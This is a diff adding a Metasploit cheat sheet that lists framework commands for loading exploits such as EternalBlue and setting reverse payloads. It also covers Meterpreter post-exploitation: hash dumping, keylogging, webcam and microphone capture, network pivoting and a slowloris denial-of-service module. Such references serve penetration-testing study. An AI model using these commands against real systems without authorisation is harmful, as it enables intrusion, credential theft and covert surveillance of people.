@@ -1,0 +1,59 @@
+🛠️ Metasploit Cheat Sheet
+🔹 Start Metasploit
+msfconsole          # Start Metasploit
+msfupdate           # Update Metasploit
+
+🔹 Searching Exploits, Payloads, Modules
+search <name>                # Search exploit/module
+search type:exploit ftp       # Search by type + keyword
+info exploit/windows/smb/ms17_010_eternalblue   # Get info
+
+🔹 Using an Exploit
+use exploit/<path>            # Load exploit
+show options                  # Show required settings
+set RHOSTS <target IP>        # Set target
+set RPORT <port>              # Set port
+
+🔹 Setting Payloads
+show payloads                 # Show compatible payloads
+set PAYLOAD <payload_name>    # Set payload
+set LHOST <your IP>           # Local host (attacker IP)
+set LPORT <port>              # Local port to listen
+
+🔹 Running Exploits
+exploit                       # Launch exploit
+run                           # Same as exploit
+exploit -j                    # Run in background job
+sessions -l                   # List active sessions
+sessions -i <id>              # Interact with session
+
+🔹 Meterpreter Basics
+sysinfo                       # Show system info
+getuid                        # Show user ID
+pwd                           # Current directory
+ls                            # List files
+cd <dir>                      # Change directory
+download <file>               # Download file
+upload <file>                 # Upload file
+shell                         # Drop into system shell
+
+🔹 Privilege Escalation
+getsystem                     # Try auto privilege escalation
+hashdump                      # Dump Windows password hashes
+keyscan_start                 # Start keylogger
+keyscan_dump                  # Dump keystrokes
+
+🔹 Network Pivoting
+run autoroute -s 192.168.1.0/24   # Add route through target
+use auxiliary/server/socks_proxy  # Set up proxy
+
+🔹 Post-Exploitation
+webcam_list                   # List webcams
+webcam_snap                   # Take webcam snapshot
+record_mic                    # Record microphone
+screenshot                    # Take screenshot
+
+🔹 Useful Auxiliary Modules
+use auxiliary/scanner/portscan/tcp      # Port scan
+use auxiliary/scanner/http/http_version # Web server version
+use auxiliary/dos/http/slowloris    
